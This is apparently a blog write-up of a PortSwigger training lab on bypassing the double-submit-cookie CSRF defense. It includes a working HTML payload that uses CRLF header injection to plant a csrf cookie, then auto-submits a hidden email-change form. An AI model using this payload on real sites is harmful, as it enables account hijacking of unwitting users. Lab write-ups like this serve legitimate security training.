+++
date = '2026-06-04T15:33:16+08:00'
draft = false
title = 'CSRF where token is duplicated in cookie'
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
The barebone logic is the same as [this problem](/training/portswigger/csrf/csrf-practioner4). But rather than associating the session cookie with CSRF tokens, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is called the **double submit** defense against CSRF.

There are many reasons why this method is advocated, with one of the reason being server performance and scaling. The CSRF tokens generated are usually checked for correct formats and so on, thus barring an attacker from generating their own token. 

For this lab, the application still doesn't filter out dangerous characters like `%0d%0a`, so we can apply the same payload again:
```html
<html>
<body>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@hotmail.snail">
<input type="hidden" name="csrf" value="<csrf-key-here>">
</form>

<img src="https://<lab-id>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=<csrf-key-here>%3b%20SameSite=None" onerror="document.getElementById('attack').submit()">

</body>
</html>
```